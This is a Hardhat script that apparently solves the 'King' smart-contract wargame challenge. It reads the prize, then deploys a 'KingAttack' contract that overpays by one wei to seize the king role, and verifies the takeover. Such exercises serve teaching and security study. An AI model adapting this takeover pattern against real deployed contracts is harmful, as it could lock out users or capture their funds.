const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("King");
  const victim = await Victim.attach(
    "0xdaEF3bCe13E9f76a786B46FD85a72796AaEBf467" // This is the contract address that you get from starting your instance
  );

  // Check what the current prize is and who the king is
  const prize1 = await victim.prize();
  console.log("The current prize is ", prize1.toString()); // after this call we know iwe have to send more than 0.001 Ether
  const king1 = await victim._king();
  console.log("The current king is ", king1);

  // This is for the attacking contract
  const MyContract = await ethers.getContractFactory("KingAttack");

  // Deploy contract
  const contract = await MyContract.deploy(
    "0xdaEF3bCe13E9f76a786B46FD85a72796AaEBf467", // This is the contract address that you get from starting your instance
    { value: 1000000000000001 } // We send 1 wei more than the current prize to become kings
  );
  await contract.deployed();

  console.log(`Deployed contract to: ${contract.address}`);

  // Verify we are the new kings (our contract)
  const king2 = await victim._king();
  console.log("The new king is ", king2);
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
